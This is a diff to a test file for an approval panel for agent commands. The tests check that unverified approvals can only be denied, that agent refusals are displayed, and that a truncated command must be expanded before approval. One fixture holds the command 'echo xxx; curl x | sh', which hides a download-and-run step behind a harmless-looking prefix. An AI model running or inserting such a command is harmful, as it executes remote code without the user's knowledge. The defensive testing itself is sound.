@@ -180,6 +180,8 @@ const approval = (o: Partial<ApprovalView>): ApprovalView => ({
   createdAt: 0,
   expiresAt: Date.now() + 60_000,
   details: { summary: "Run npm test" },
+  verified: true,
+  detailsHash: "a".repeat(64),
   rev: 1,
   ...o,
 });
@@ -287,7 +289,15 @@ describe("panel: sign-in screen", () => {
         new Promise((resolve) => {
           onDisplay({ shortCode: "KQ7RM" });
           release = () =>
-            resolve({ ok: true, deviceId: "d", customToken: "h", passkey: "unavailable", credential: null });
+            resolve({
+              ok: true,
+              deviceId: "d",
+              customToken: "h",
+              passkey: "unavailable",
+              credential: null,
+              agents: [],
+              droppedAgents: [],
+            });
         }),
     });
     const { container } = renderPanel({ signIn: <SignIn controller={controller} /> }, "en");
@@ -311,5 +321,79 @@ describe("panel: sign-in screen", () => {
     fireEvent.click(screen.getByText("Sign in"));
     expect(await screen.findByRole("alert")).toHaveProperty("textContent", "Couldn't open the browser.");
     expect(screen.getByText("Try again")).toBeTruthy();
+  });
+});
+
+describe("panel: endorsement refusals are never silent (R-L13)", () => {
+  const agent = (lastEvent: unknown) => ({
+    deviceId: "agent1",
+    role: "agent" as const,
+    kind: "laptop",
+    platform: "linux",
+    name: "Laptop",
+    revoked: false,
+    online: true,
+    lastSeenAt: 1,
+    devMode: { on: false, toggles: [], since: null },
+    policyHash: null,
+    lastEvent,
+    rev: 1,
+  });
+  const refused = {
+    v: 1,
+    type: "trust.endorsement_refused",
+    deviceId: "agent1",
+    clientDeviceId: "dev_new",
+    endorsedBy: "dev_phone",
+    reason: "missing_step_up",
+    t: 1,
+  };
+
+  it("shows the agent's refusal with what to do", () => {
+    const f = fakeClient({ devices: [agent(refused)] });
+    renderPanel({ client: f.client, initialTab: "security" }, "en");
+    expect(screen.getByRole("alert").textContent).toMatch(/“Laptop” refused a new device: .*passkey/);
+  });
+
+  it("nothing when no agent reports one (or the event is something else)", () => {
+    const f = fakeClient({
+      devices: [
+        agent({ v: 1, type: "policy.changed", deviceId: "agent1", policyHash: "a".repeat(64), t: 1 }),
+        agent(null),
+      ],
+    });
+    const { container } = renderPanel({ client: f.client, initialTab: "security" }, "en");
+    expect(container.querySelector('[data-section="notices"]')).toBeNull();
+  });
+});
+
+describe("panel: approvals bound to what the agent signed (R-H1, R-M10)", () => {
+  it("an unverified approval is marked and can only be denied", () => {
+    const f = fakeClient({ approvals: [approval({ verified: false, detailsHash: null })] });
+    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
+    expect(container.querySelector("[data-unverified]")?.textContent).toMatch(/Unverified/);
+    expect([...container.querySelectorAll('[data-aid="a1"] button')].map((b) => b.textContent)).toEqual(["Deny"]);
+  });
+
+  it("a truncated summary: Approve stays disabled until the full command is opened", () => {
+    const f = fakeClient({
+      approvals: [
+        approval({
+          details: {
+            summary: "Bash: echo xxx… (+42 chars)",
+            summaryTruncated: true,
+            input: { command: "echo xxx; curl x | sh" },
+          },
+        }),
+      ],
+    });
+    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
+    const approve = screen.getByText("Approve") as HTMLButtonElement;
+    expect(approve.disabled).toBe(true);
+    const details = container.querySelector("details")!;
+    details.open = true;
+    fireEvent(details, new Event("toggle"));
+    expect(approve.disabled).toBe(false);
+    expect(container.querySelector("pre.full-input")?.textContent).toContain("curl x | sh");
   });
 });
